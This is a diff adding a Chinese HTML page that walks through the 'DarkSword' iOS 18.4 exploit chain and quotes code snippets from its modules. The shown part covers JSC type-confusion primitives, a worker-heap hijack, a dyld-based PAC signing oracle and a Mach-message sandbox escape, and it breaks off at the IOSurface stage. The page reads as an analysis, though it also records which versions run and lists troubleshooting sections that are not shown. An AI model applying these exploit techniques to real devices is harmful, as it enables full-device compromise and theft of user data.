@@ -1,0 +1,1048 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="color-scheme" content="dark">
+<title>DarkSword 实际执行流程 · 代码核实版</title>
+<style>
+/* ── 令牌 ─────────────────────────────────────────────────────────
+   沿用项目既有调色（与 debug.html / admin 一致），不引入第二色系。
+   中性色承担结构，蓝色只用一处（强调/链接/当前项）。            */
+:root{
+  --bg:#0e1116;
+  --surface:#161b22;
+  --surface-2:#0d1117;
+  --surface-3:#1c2128;
+  --border:#30363d;
+  --border-soft:rgba(255,255,255,.06);
+
+  --text:#c9d1d9;
+  --text-hi:#e6edf3;
+  --text-lo:#8b949e;
+  --text-dim:#6e7681;
+
+  --accent:#79c0ff;
+  --accent-dim:#388bfd;
+  --accent-wash:rgba(121,192,255,.10);
+
+  /* 语义色：仅用于纠错/风险/通过三类标注，不做装饰 */
+  --bad:#f85149;
+  --bad-wash:rgba(248,81,73,.10);
+  --warn:#e3b341;
+  --warn-wash:rgba(227,179,65,.10);
+  --ok:#3fb950;
+  --ok-wash:rgba(63,185,80,.10);
+
+  --r-sm:6px; --r-md:10px; --r-lg:14px; --r-xl:20px;
+  --s1:4px; --s2:8px; --s3:12px; --s4:16px; --s6:24px; --s8:32px;
+  --s12:48px; --s16:64px; --s20:80px;
+
+  --ease:cubic-bezier(.22,1,.36,1);
+  --dur:200ms; --dur-fast:150ms;
+
+  --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace;
+  --sans:-apple-system,BlinkMacSystemFont,"Segoe UI",system-ui,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  --topbar-h:52px;
+}
+
+*{box-sizing:border-box}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+@media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}
+  *{animation-duration:.01ms!important;transition-duration:.01ms!important}}
+
+body{
+  margin:0;background:var(--bg);color:var(--text);
+  font:400 15px/1.75 var(--sans);
+  -webkit-font-smoothing:antialiased;
+  padding-bottom:var(--s20);
+}
+
+/* ── 顶部：进度条 + 栏 ─────────────────────────────────────────── */
+#prog{
+  position:fixed;top:0;left:0;height:2px;width:0;
+  background:linear-gradient(90deg,var(--accent-dim),var(--accent));
+  z-index:60;transition:width 80ms linear;
+}
+.topbar{
+  position:sticky;top:0;z-index:50;height:var(--topbar-h);
+  display:flex;align-items:center;gap:var(--s3);
+  padding:0 var(--s4);
+  background:rgba(14,17,22,.82);
+  backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--border);
+}
+.brand{
+  font:600 11.5px/1 var(--mono);letter-spacing:.06em;color:var(--text-lo);
+  text-transform:uppercase;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
+}
+.brand b{color:var(--accent);font-weight:600}
+.topbar .spacer{flex:1}
+.navbtn{
+  display:flex;align-items:center;gap:6px;
+  background:var(--surface);color:var(--text);
+  border:1px solid var(--border);border-radius:var(--r-sm);
+  padding:6px 11px;font:500 12.5px/1 var(--sans);cursor:pointer;
+  transition:background var(--dur-fast) var(--ease),border-color var(--dur-fast) var(--ease);
+}
+.navbtn:hover{background:var(--surface-3);border-color:#484f58}
+.navbtn svg{width:13px;height:13px;flex:none;opacity:.75}
+
+/* 目录抽屉 */
+#toc{
+  position:fixed;top:var(--topbar-h);left:0;right:0;z-index:45;
+  max-height:0;overflow:hidden;
+  background:var(--surface);border-bottom:1px solid transparent;
+  transition:max-height var(--dur) var(--ease),border-color var(--dur) var(--ease);
+}
+#toc.open{max-height:min(74vh,560px);overflow-y:auto;border-bottom-color:var(--border)}
+#toc ul{list-style:none;margin:0;padding:var(--s2) 0 var(--s4)}
+#toc li a{
+  display:block;padding:9px var(--s4);color:var(--text-lo);text-decoration:none;
+  font-size:13.5px;border-left:2px solid transparent;
+  transition:color var(--dur-fast) var(--ease),background var(--dur-fast) var(--ease);
+}
+#toc li a:hover{color:var(--text-hi);background:var(--surface-2)}
+#toc li a .no{
+  display:inline-block;min-width:22px;font:600 11px/1 var(--mono);
+  color:var(--text-dim);
+}
+#toc li.sub a{padding-left:calc(var(--s4) + 22px);font-size:12.5px}
+#toc li.cur a{color:var(--accent);border-left-color:var(--accent);background:var(--accent-wash)}
+#toc li.cur a .no{color:var(--accent)}
+
+/* ── 版心 ─────────────────────────────────────────────────────── */
+main{max-width:820px;margin:0 auto;padding:0 var(--s4)}
+.wrap{padding-top:var(--s8)}
+
+h1{
+  font-size:clamp(22px,5.2vw,30px);line-height:1.28;font-weight:600;
+  letter-spacing:-.02em;color:var(--text-hi);margin:0 0 var(--s3);
+}
+.lede{
+  color:var(--text-lo);font-size:14.5px;line-height:1.8;margin:0 0 var(--s4);
+}
+.lede strong{color:var(--text)}
+.verdict{
+  display:flex;flex-wrap:wrap;gap:var(--s2);
+  padding:var(--s3) var(--s4);margin:0 0 var(--s8);
+  background:var(--surface);border:1px solid var(--border);border-radius:var(--r-md);
+  font-size:12.5px;color:var(--text-lo);align-items:center;
+}
+.verdict .tag{
+  font:600 11px/1 var(--mono);letter-spacing:.04em;
+  padding:4px 8px;border-radius:var(--r-sm);
+  background:var(--ok-wash);color:var(--ok);border:1px solid rgba(63,185,80,.3);
+}
+.verdict .tag.partial{
+  background:var(--warn-wash);color:var(--warn);border-color:rgba(227,179,65,.3);
+}
+
+h2{
+  font-size:clamp(17px,3.6vw,21px);font-weight:600;letter-spacing:-.01em;
+  color:var(--text-hi);margin:var(--s16) 0 var(--s4);
+  padding-top:var(--s6);border-top:1px solid var(--border-soft);
+  scroll-margin-top:calc(var(--topbar-h) + 12px);
+}
+h2:first-of-type{border-top:0;padding-top:0;margin-top:var(--s8)}
+h2 .h2no{
+  display:inline-block;font:600 12px/1 var(--mono);color:var(--accent);
+  background:var(--accent-wash);border:1px solid rgba(121,192,255,.25);
+  border-radius:var(--r-sm);padding:3px 7px;margin-right:9px;
+  vertical-align:2px;
+}
+
+h3{
+  font-size:15.5px;font-weight:600;color:var(--text-hi);
+  margin:var(--s8) 0 var(--s3);letter-spacing:-.005em;
+  scroll-margin-top:calc(var(--topbar-h) + 12px);
+}
+
+p{margin:0 0 var(--s3)}
+a{color:var(--accent);text-decoration:none;border-bottom:1px solid rgba(121,192,255,.3)}
+a:hover{border-bottom-color:var(--accent)}
+code{
+  font:400 .875em/1.5 var(--mono);
+  background:var(--surface-2);border:1px solid var(--border-soft);
+  border-radius:4px;padding:1.5px 5px;color:#a5d6ff;
+  word-break:break-word;
+}
+strong{color:var(--text-hi);font-weight:600}
+
+/* ── 模块流水线（全页唯一的重视觉）───────────────────────────── */
+.pipe{
+  margin:var(--s4) 0 var(--s8);
+  background:linear-gradient(180deg,var(--surface),var(--surface-2));
+  border:1px solid var(--border);border-radius:var(--r-lg);
+  overflow:hidden;
+}
+.pipe-head{
+  padding:var(--s3) var(--s4);border-bottom:1px solid var(--border-soft);
+  font:600 11px/1 var(--mono);letter-spacing:.08em;text-transform:uppercase;
+  color:var(--text-dim);
+}
+.pipe-body{padding:var(--s4)}
+.step{position:relative;padding-left:30px;padding-bottom:var(--s4)}
+.step:last-child{padding-bottom:0}
+.step::before{
+  content:'';position:absolute;left:8px;top:9px;width:9px;height:9px;
+  border-radius:50%;background:var(--surface-3);
+  border:1.5px solid var(--border);z-index:1;
+}
+.step:not(:last-child)::after{
+  content:'';position:absolute;left:12px;top:20px;bottom:-2px;width:1px;
+  background:linear-gradient(180deg,var(--border),var(--border-soft));
+}
+.step.hi::before{background:var(--accent);border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-wash)}
+.step-file{
+  font:600 13.5px/1.4 var(--mono);color:var(--text-hi);
+  display:flex;align-items:baseline;gap:8px;flex-wrap:wrap;
+}
+.step-file .role{
+  font:400 11px/1 var(--sans);color:var(--text-dim);
+  letter-spacing:.02em;
+}
+.step-desc{font-size:12.5px;color:var(--text-lo);margin-top:2px}
+.pipe-note{
+  margin-top:var(--s4);padding-top:var(--s3);border-top:1px solid var(--border-soft);
+  font-size:12.5px;color:var(--text-lo);
+}
+
+/* ── 表格：窄屏转堆叠卡片 ─────────────────────────────────────── */
+.tbl{margin:var(--s4) 0}
+.tbl table{
+  width:100%;border-collapse:collapse;
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:var(--r-md);overflow:hidden;
+  font-size:13px;
+}
+.tbl th,.tbl td{
+  padding:9px 12px;text-align:left;vertical-align:top;
+  border-bottom:1px solid var(--border-soft);
+}
+.tbl tr:last-child td{border-bottom:0}
+.tbl th{
+  background:var(--surface-2);color:var(--text-lo);
+  font:600 11.5px/1.4 var(--sans);letter-spacing:.03em;
+  white-space:nowrap;
+}
+.tbl td:first-child{color:var(--text-hi);font-weight:500}
+
+@media (max-width:640px){
+  /* 堆叠：每行变一张小卡，用 data-label 补回表头语义 */
+  .tbl table,.tbl tbody,.tbl tr,.tbl td{display:block;width:100%}
+  .tbl thead{display:none}
+  .tbl tr{
+    border-bottom:1px solid var(--border-soft);
+    padding:var(--s2) 0;
+  }
+  .tbl tr:last-child{border-bottom:0}
+  .tbl td{border-bottom:0;padding:5px 12px}
+  .tbl td::before{
+    content:attr(data-label);
+    display:block;font:600 10.5px/1.5 var(--mono);
+    letter-spacing:.05em;text-transform:uppercase;
+    color:var(--text-dim);margin-bottom:2px;
+  }
+  .tbl td:first-child{
+    font-weight:600;color:var(--text-hi);
+    padding-bottom:7px;
+  }
+  .tbl td:first-child::before{color:var(--accent);opacity:.7}
+}
+
+/* ── 代码块 ───────────────────────────────────────────────────── */
+.code{
+  position:relative;margin:var(--s3) 0;
+  background:var(--surface-2);border:1px solid var(--border);
+  border-radius:var(--r-md);overflow:hidden;
+}
+.code-top{
+  display:flex;align-items:center;gap:var(--s2);
+  padding:6px 10px;background:var(--surface);
+  border-bottom:1px solid var(--border-soft);
+}
+.code-lang{
+  font:600 10.5px/1 var(--mono);letter-spacing:.06em;text-transform:uppercase;
+  color:var(--text-dim);
+}
+.code-file{
+  font:400 11.5px/1 var(--mono);color:var(--text-lo);
+  overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1;min-width:0;
+}
+.copybtn{
+  flex:none;background:transparent;color:var(--text-dim);
+  border:1px solid transparent;border-radius:var(--r-sm);
+  padding:3px 7px;font:500 11px/1 var(--sans);cursor:pointer;
+  transition:color var(--dur-fast) var(--ease),background var(--dur-fast) var(--ease),border-color var(--dur-fast) var(--ease);
+}
+.copybtn:hover{color:var(--text);background:var(--surface-3);border-color:var(--border)}
+.copybtn.done{color:var(--ok);border-color:rgba(63,185,80,.35)}
+.code pre{
+  margin:0;padding:var(--s3) var(--s4);
+  overflow-x:auto;-webkit-overflow-scrolling:touch;
+  font:400 12.5px/1.7 var(--mono);
+  color:#c9d1d9;
+}
+.code pre::-webkit-scrollbar{height:6px}
+.code pre::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
+.code .cmt{color:var(--text-dim)}
+.code .kw{color:#ff7b72}
+.code .fn{color:#d2a8ff}
+.code .str{color:#a5d6ff}
+.code .num{color:#79c0ff}
+
+/* ── 标注块：纠错 / 提示 / 证据等级 ──────────────────────────── */
+.note{
+  margin:var(--s3) 0;padding:var(--s3) var(--s4);
+  border-radius:var(--r-md);border:1px solid;
+  border-left-width:3px;font-size:13.5px;line-height:1.7;
+}
+.note .nt{
+  display:block;font:600 11px/1 var(--mono);letter-spacing:.06em;
+  text-transform:uppercase;margin-bottom:5px;
+}
+.note.bad{background:var(--bad-wash);border-color:rgba(248,81,73,.28);border-left-color:var(--bad)}
+.note.bad .nt{color:var(--bad)}
+.note.warn{background:var(--warn-wash);border-color:rgba(227,179,65,.28);border-left-color:var(--warn)}
+.note.warn .nt{color:var(--warn)}
+.note.ok{background:var(--ok-wash);border-color:rgba(63,185,80,.28);border-left-color:var(--ok)}
+.note.ok .nt{color:var(--ok)}
+.note.info{background:var(--accent-wash);border-color:rgba(121,192,255,.22);border-left-color:var(--accent)}
+.note.info .nt{color:var(--accent)}
+.note p:last-child{margin-bottom:0}
+.note code{background:rgba(0,0,0,.3)}
+
+/* OL/UL 正文列表 */
+.bodylist{margin:0 0 var(--s3);padding-left:0;list-style:none;counter-reset:n}
+.bodylist li{
+  position:relative;padding-left:26px;margin-bottom:6px;
+  font-size:13.5px;line-height:1.7;
+}
+.bodylist li::before{
+  counter-increment:n;content:counter(n);
+  position:absolute;left:0;top:1px;
+  width:17px;height:17px;border-radius:50%;
+  background:var(--surface-3);border:1px solid var(--border);
+  font:600 10px/16px var(--mono);color:var(--text-lo);text-align:center;
+}
+.bodylist li strong{color:var(--text-hi)}
+
+.ulist{margin:0 0 var(--s3);padding-left:18px}
+.ulist li{font-size:13.5px;line-height:1.7;margin-bottom:5px}
+.ulist li::marker{color:var(--accent-dim)}
+
+/* ── 差异对照：左右分栏（窄屏堆叠）───────────────────────────── */
+.diff{
+  margin:var(--s4) 0;border:1px solid var(--border);
+  border-radius:var(--r-md);overflow:hidden;background:var(--surface);
+}
+.diff-row{display:grid;grid-template-columns:1fr;}
+.diff-row+.diff-row{border-top:1px solid var(--border-soft)}
+.diff-cell{padding:var(--s3) var(--s4);font-size:13px;line-height:1.65}
+.diff-cell+.diff-cell{border-top:1px dashed var(--border-soft)}
+.diff-cell.myth{color:var(--text-lo)}
+.diff-cell.myth::before{
+  content:'流传';display:block;font:600 10px/1 var(--mono);
+  letter-spacing:.08em;color:var(--bad);opacity:.85;margin-bottom:4px;
+}
+.diff-cell.myth s{text-decoration-color:var(--bad);text-decoration-thickness:1.5px}
+.diff-cell.fact{color:var(--text)}
+.diff-cell.fact::before{
+  content:'实际';display:block;font:600 10px/1 var(--mono);
+  letter-spacing:.08em;color:var(--ok);opacity:.85;margin-bottom:4px;
+}
+.diff-cell .src{
+  display:block;margin-top:5px;font:400 11.5px/1.5 var(--mono);
+  color:var(--text-dim);word-break:break-all;
+}
+@media (min-width:700px){
+  .diff-cell.myth::before{content:'流传的说法'}
+  .diff-cell.fact::before{content:'代码里实际是这样'}
+  /* 宽屏才分两栏：左「流传」右「实际」，虚线做中线 */
+  .diff-row{grid-template-columns:1fr 1fr}
+  .diff-cell+.diff-cell{border-top:0;border-left:1px dashed var(--border-soft)}
+}
+
+/* ── 页脚 ─────────────────────────────────────────────────────── */
+footer{
+  max-width:820px;margin:var(--s16) auto 0;padding:var(--s6) var(--s4) 0;
+  border-top:1px solid var(--border-soft);
+  color:var(--text-dim);font-size:12px;line-height:1.7;
+}
+footer code{font-size:11.5px}
+
+/* 回到顶部 */
+#top{
+  position:fixed;right:var(--s4);bottom:var(--s4);z-index:40;
+  width:40px;height:40px;border-radius:var(--r-md);
+  background:var(--surface);border:1px solid var(--border);
+  color:var(--text-lo);cursor:pointer;
+  display:flex;align-items:center;justify-content:center;
+  opacity:0;pointer-events:none;transform:translateY(6px);
+  transition:opacity var(--dur) var(--ease),transform var(--dur) var(--ease),
+             background var(--dur-fast) var(--ease),border-color var(--dur-fast) var(--ease);
+}
+#top.show{opacity:1;pointer-events:auto;transform:translateY(0)}
+#top:hover{background:var(--surface-3);border-color:#484f58;color:var(--text)}
+#top svg{width:15px;height:15px}
+
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+</style>
+</head>
+<body>
+
+<div id="prog"></div>
+
+<header class="topbar">
+  <div class="brand">DarkSword / <b>chain-flow</b></div>
+  <span class="spacer"></span>
+  <button class="navbtn" id="navbtn" aria-expanded="false" aria-controls="toc">
+    <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round">
+      <path d="M2 4h12M2 8h12M2 12h12"/>
+    </svg>
+    目录
+  </button>
+</header>
+
+<nav id="toc" aria-label="目录">
+  <ul>
+    <li><a href="#s0"><span class="no">00</span>一句话总结</a></li>
+    <li><a href="#s1"><span class="no">01</span>设备指纹 / 偏移表选择</a></li>
+    <li><a href="#s2"><span class="no">02</span>JSC → addrof / fakeobj</a></li>
+    <li><a href="#s3"><span class="no">03</span>WebContent RCE</a></li>
+    <li><a href="#s4"><span class="no">04</span>dyld interpose + PAC</a></li>
+    <li><a href="#s5"><span class="no">05</span>sbx0 沙盒逃逸</a></li>
+    <li><a href="#s6"><span class="no">06</span>sbx1 IOSurface</a></li>
+    <li><a href="#s7"><span class="no">07</span>pe_main 内核读写</a></li>
+    <li><a href="#s8"><span class="no">08</span>注入 + 窃取上报</a></li>
+    <li><a href="#diff"><span class="no">09</span>差异对照</a></li>
+    <li><a href="#req"><span class="no">10</span>运行前提</a></li>
+    <li><a href="#trouble"><span class="no">11</span>故障定位速查</a></li>
+    <li><a href="#files"><span class="no">12</span>证据文件清单</a></li>
+  </ul>
+</nav>
+
+<main class="wrap">
+
+  <h1>DarkSword 实际执行流程</h1>
+  <p class="lede">
+    以<strong>代码为准</strong>梳理的五模块接力链，不是 README 的宣传性描述。
+    每条流程带文件与行号，可自行跳转核对。重点纠正流传较广的三处误传：
+    <strong>「ANGLE 越界」</strong>、<strong>「mach_port UAF 提权 root」</strong>、
+    <strong>「IOSurface 在 WebContent 阶段」</strong>。
+  </p>
+  <div class="verdict">
+    <span>适用版本</span>
+    <span class="tag">iOS 18.4 – 18.4.1 完整</span>
+    <span class="tag partial">18.5 – 18.6.2 仅前段可跑</span>
+  </div>
+
+  <!-- ══ 00 ══ -->
+  <h2 id="s0"><span class="h2no">00</span>一句话总结</h2>
+  <p>链路是<strong>一条单向流水线</strong>，五个 JS 模块按固定顺序接力，前一个 <code>eval</code> 后一个：</p>
+
+  <div class="pipe">
+    <div class="pipe-head">调用链</div>
+    <div class="pipe-body">
+      <div class="step hi">
+        <div class="step-file">rce_loader.js</div>
+        <div class="step-desc">入口，写 <code>uid</code> 后隐藏 iframe 加载 frame.html</div>
+      </div>
+      <div class="step">
+        <div class="step-file">rce_worker.js <span class="role">Web Worker</span></div>
+        <div class="step-desc">跑 stage1，建 fcall 原语，随后 eval sbx0</div>
+      </div>
+      <div class="step">
+        <div class="step-file">sbx0_main_18.4.js</div>
+        <div class="step-desc">WebContent 沙箱逃逸（Mach 消息伪造），结束自杀</div>
+      </div>
+      <div class="step">
+        <div class="step-file">sbx1_main.js</div>
+        <div class="step-desc">IOSurface → 内核原语，跑通后 spawn_pe()</div>
+      </div>
+      <div class="step hi">
+        <div class="step-file">pe_main.js</div>
+        <div class="step-desc">ICMPv6 内核读写 → 沙箱扩展篡改 → 跨进程注入 → 窃取上报</div>
+      </div>
+      <div class="pipe-note">
+        模块顺序<strong>不可调换</strong>：sbx0 依赖 worker 建立的 fcall 原语；sbx1 依赖 sbx0 建好的跨进程桥梁；
+        pe_main 依赖 sbx1 提供的内核读写。
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ 01 ══ -->
+  <h2 id="s1"><span class="h2no">01</span>设备指纹 / 偏移表选择</h2>
+
+  <div class="tbl"><table>
+    <thead><tr><th>项</th><th>内容</th></tr></thead>
+    <tbody>
+      <tr><td data-label="项">文件</td><td data-label="内容"><code>rce_loader.js</code> → <code>rce_module.js</code></td></tr>
+      <tr><td data-label="项">关键行</td><td data-label="内容"><code>rce_module.js:3237</code></td></tr>
+    </tbody>
+  </table></div>
+
+  <div class="code">
+    <div class="code-top"><span class="code-lang">js</span><span class="code-file">rce_module.js:3237</span>
+      <button class="copybtn">复制</button></div>
+    <pre><span class="cmt">// 用 linkedit 地址反查机型，而不是读芯片型号</span>
+device_model = linkedit_to_device[<span class="fn">ios_version</span>][<span class="fn">libsystem_pthread_linkedit</span>];
+chipset = device_chipset[device_model];
+offsets = rce_offsets[device_model];
+slide   = globalFuncParseFloat - offsets.JavaScriptCore__globalFuncParseFloat;</pre>
+  </div>
+
+  <p>
+    <strong>实际做法</strong>：不是「读芯片型号」，而是<strong>用 <code>libsystem_pthread</code> 的
+    linkedit 地址反查机型</strong>。<code>ios_version</code> 来自 UA
+    （<code>iPhone OS 18_5</code> → <code>'18,5'</code>），linkedit 地址运行时读出，
+    两者一起查 <code>linkedit_to_device</code> 得到 <code>device_model</code>，
+    再查 <code>rce_offsets</code> 拿偏移。
+  </p>
+
+  <div class="note bad">
+    <span class="nt">必然失败点</span>
+    若 <code>ios_version</code> 或 linkedit 地址不在表里 →
+    <code>device_model = undefined</code> → 下一行取
+    <code>offsets.JavaScriptCore__*</code> <strong>立即 TypeError</strong>。
+  </div>
+
+  <div class="note warn">
+    <span class="nt">证据等级</span>
+    18.5 走到 ⑤ 才挂是<strong>实测</strong>（真机日志）；
+    18.3.1 在此处崩溃是<strong>代码推断</strong>
+    （<code>linkedit_to_device</code> 无 <code>18,3</code> 键），
+    未在 18.3.1 真机上验证过。
+  </div>
+
+  <!-- ══ 02 ══ -->
+  <h2 id="s2"><span class="h2no">02</span>JSC 内存破坏 → addrof / fakeobj</h2>
+
+  <div class="tbl"><table>
+    <thead><tr><th>项</th><th>内容</th></tr></thead>
+    <tbody>
+      <tr><td data-label="项">文件</td><td data-label="内容"><code>rce_module.js</code></td></tr>
+      <tr><td data-label="项">关键行</td><td data-label="内容"><code>2754</code> stage1 · <code>2760</code> addrof · <code>2764</code> fakeobj · <code>3447</code> check_victim</td></tr>
+    </tbody>
+  </table></div>
+
+  <div class="code">
+    <div class="code-top"><span class="code-lang">js</span><span class="code-file">rce_module.js:2760 / 2764</span>
+      <button class="copybtn">复制</button></div>
+    <pre><span class="kw">function</span> <span class="fn">addrof</span>(object) { boxed_arr[<span class="num">0</span>] = o; <span class="kw">return</span> BigInt.fromDouble(unboxed_arr[<span class="num">0</span>]); }
+<span class="kw">function</span> <span class="fn">fakeobj</span>(addr)   { unboxed_arr[<span class="num">0</span>] = addr.asDouble(); <span class="kw">return</span> boxed_arr[<span class="num">0</span>]; }</pre>
+  </div>
+
+  <div class="code">
+    <div class="code-top"><span class="code-lang">js</span><span class="code-file">rce_module.js:3447 · 建立 OOB 重叠</span>
+      <button class="copybtn">复制</button></div>
+    <pre><span class="kw">const</span> <span class="fn">check_victim</span> = () =&gt; {
+    <span class="kw">for</span> (<span class="kw">let</span> j = <span class="num">0</span>; j &lt; victim_cursor; j++){
+        <span class="kw">if</span> (victim_list[j].length &gt; (victim_array_allocation_size*<span class="num">10</span>)){ oob_array_idx = j; <span class="kw">break</span>; }
+    }
+    ...
+    <span class="kw">if</span>(oob_array[i+<span class="num">1</span>] === egg1 &amp;&amp; oob_array[i+<span class="num">2</span>] === egg2){ overlap_array_idx = oob_array[i+<span class="num">3</span>]; ... }
+};</pre>
+  </div>
+
+  <div class="note bad">
+    <span class="nt">纠错</span>
+    这里是 <strong>JSC 类型混淆</strong>（破坏数组长度字段造出 OOB 数组），
+    <strong>不是「WebKit UAF」</strong>。
+    <code>the_oob_object.splice(30,0,...)</code> 配合 egg 标记扫描，是典型类型混淆手法。
+  </div>
+
+  <p>
+    <strong>实测特征</strong>：该阶段<strong>不稳定</strong>，失败打 <code>Failed RCE</code>，
+    成功打 <code>RCE success</code>。失败诊断（已注入）：
+    <code>DIAG no-oob-array cursor=N want_len&gt;N max_len=N heap_relative=normal</code>。
+  </p>
+
+  <!-- ══ 03 ══ -->
+  <h2 id="s3"><span class="h2no">03</span>WebContent RCE（stage2 定位 + 劫持）</h2>
+
+  <div class="tbl"><table>
+    <thead><tr><th>项</th><th>内容</th></tr></thead>
+    <tbody>
+      <tr><td data-label="项">文件</td><td data-label="内容"><code>rce_module.js</code></td></tr>
+      <tr><td data-label="项">关键行</td><td data-label="内容"><code>3252</code> stage2</td></tr>
+    </tbody>
+  </table></div>
+
+  <div class="code">
+    <div class="code-top"><span class="code-lang">js</span><span class="code-file">rce_module.js:3252</span>
+      <button class="copybtn">复制</button></div>
+    <pre><span class="fn">stage2</span>() {
+    <span class="kw">const</span> contexts = <span class="kw">this</span>.read64(offsets.WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts);
+    ...
+    <span class="kw">if</span> (vtable.noPAC() != offsets.WebCore__DedicatedWorkerGlobalScope_vtable) <span class="kw">continue</span>;
+    <span class="kw">const</span> id = <span class="kw">this</span>.read64(scriptExecutionContext + <span class="num">0x138</span>n);   <span class="cmt">// 取 id 最大的 worker</span>
+    ...
+    <span class="kw">this</span>.write64(unboxed_arr + <span class="num">8</span>n, butterfly);                  <span class="cmt">// 劫持 JS 堆</span>
+}</pre>
+  </div>
+
+  <p>定位<strong>自己的 Worker 上下文</strong>并劫持其 JS 堆，从而在 WebContent 进程内获得任意 JS 执行。之后 <code>rce_worker.js</code> 接手。</p>
+
+  <!-- ══ 04 ══ -->
+  <h2 id="s4"><span class="h2no">04</span>dyld interpose + PAC 绕过 → fcall</h2>
+
+  <div class="tbl"><table>
+    <thead><tr><th>项</th><th>内容</th></tr></thead>
+    <tbody>
+      <tr><td data-label="项">文件</td><td data-label="内容"><code>rce_worker.js</code></td></tr>
+      <tr><td data-label="项">关键行</td><td data-label="内容"><code>513-515</code> InterposeTupleAll · <code>641</code> interpose signPointer · <code>668/672</code> paciza_dlopen / signPointer</td></tr>
+    </tbody>
+  </table></div>
+
+  <div class="code">
+    <div class="code-top"><span class="code-lang">js</span><span class="code-file">rce_worker.js:513</span>
+      <button class="copybtn">复制</button></div>
+    <pre><span class="kw">const</span> p_InterposeTupleAll_buffer = runtimeState + <span class="num">0xb8</span>n;
+<span class="kw">const</span> p_InterposeTupleAll_size   = runtimeState + <span class="num">0xc0</span>n;</pre>
+  </div>
+
+  <div class="code">
+    <div class="code-top"><span class="code-lang">js</span><span class="code-file">rce_worker.js:641 / 668</span>
+      <button class="copybtn">复制</button></div>
+    <pre><span class="cmt">// :641 — 把 dyld 的 signPointer 挂到 CMPhoto 的调用点上</span>
+<span class="fn">interpose</span>(offsets.CMPhoto__CMPhotoCompressionSessionAddExif, offsets.dyld__signPointer);
+
+<span class="cmt">// :668 — 取回已签名的函数指针，得到 PAC 签名 oracle</span>
+<span class="kw">const</span> paciza_dlopen      = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation);
+<span class="kw">const</span> paciza_signPointer = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddExif);</pre>
+  </div>
+
+  <div class="note bad">
+    <span class="nt">纠错 · 重要</span>
+    <strong>此阶段没有「ANGLE 越界」</strong>。全库搜索 <code>ANGLE</code> 零命中。
+  </div>
+
+  <p><strong>实际手法</strong>：</p>
+  <ol class="bodylist">
+    <li>破坏 <code>CFBundle</code> → <code>dlopen</code> 加载 <code>AVSpeechSynthesisVoice</code></li>
+    <li>劫持 dyld 的 <code>InterposeTupleAll</code>（<code>runtimeState + 0xb8/0xc0</code>）</li>
+    <li><strong>把 dyld 的 <code>signPointer</code> 当 PAC 签名 oracle 用</strong> → 拿到 <code>paciza_*</code> / <code>pacib_*</code> 签名结果</li>
+    <li>起 JOP 线程 → 得 <code>fcall</code>（任意函数调用）</li>
+  </ol>
+
+  <div class="note info">
+    <span class="nt">注意位置</span>
+    PAC 绕过发生在<strong>这里</strong>，不是流程末段。后续 sbx0 / sbx1 / pe_main
+    都只是<strong>复用</strong>已建好的 fcall。
+  </div>
+
+  <!-- ══ 05 ══ -->
+  <h2 id="s5"><span class="h2no">05</span>sbx0：WebContent 沙盒逃逸（Mach 消息伪造）</h2>
+
+  <div class="tbl"><table>
+    <thead><tr><th>项</th><th>内容</th></tr></thead>
+    <tbody>
+      <tr><td data-label="项">文件</td><td data-label="内容"><code>sbx0_main_18.4.js</code></td></tr>
+      <tr><td data-label="项">关键行</td><td data-label="内容"><code>18-19</code> dlsym · <code>6700</code> mach_port_insert_right · <code>8440</code> Calling _exit</td></tr>
+    </tbody>
+  </table></div>
+
+  <div class="code">
+    <div class="code-top"><span class="code-lang">js</span><span class="code-file">sbx0_main_18.4.js:18 / 6700</span>
+      <button class="copybtn">复制</button></div>
+    <pre>offsets.mach_port_insert_right = <span class="fn">dlsym</span>(libsystem_kernel, <span class="str">'mach_port_insert_right'</span>).noPAC();
+offsets.mach_msg_fn            = <span class="fn">dlsym</span>(libsystem_kernel, <span class="str">'mach_msg'</span>).noPAC();
+
+<span class="cmt">// :6700 — 插入端口权限，伪造 Mach 消息</span>
+kr = <span class="fn">fcall</span>(offsets.mach_port_insert_right, __mach_task_self, receivePort, receivePort, <span class="num">0x14</span>n);</pre>
+  </div>
+
+  <div class="note bad">
+    <span class="nt">纠错</span>
+    <strong>不是 ICMPv6 socket，也不是 ANGLE</strong>。这里用 <strong>Mach 消息</strong>
+    （<code>mach_msg</code> + 端口权限插入）伪造消息，骗过 <strong>GPU 进程的
+    RemoteRenderingBackend 连接</strong>，从而获得跨进程调用能力。
+  </div>
+
+  <p><strong>结束时主动自杀</strong>（设计如此，清理痕迹）：</p>
+
+  <div class="code">
+    <div class="code-top"><span class="code-lang">js</span><span class="code-file">sbx0_main_18.4.js:8440</span>
+      <button class="copybtn">复制</button></div>
+    <pre><span class="fn">LOG</span>(<span class="str">"Calling _exit()"</span>);
+<span class="fn">fcall</span>(offsets.exit, <span class="num">0</span>n);</pre>
+  </div>
+
+  <div class="note info">
+    <span class="nt">副作用</span>
+    这也解释了为什么日志会断在 sbx0 之后 —— WebContent 进程被自己杀掉了。
+  </div>
+
+  <!-- ══ 06 ══ -->
+  <h2 id="s6"><span class="h2no">06</span>sbx1：IOSurface → 内核原语</h2>
+
+  <div class="tbl"><table>
+    <thead><tr><th>项</th><th>内容</th></tr></thead>
+    <tbody>
+      <tr><td data-label="项">文件</td><td data-label="内容"><code>sbx1_main.js</code></td></tr>
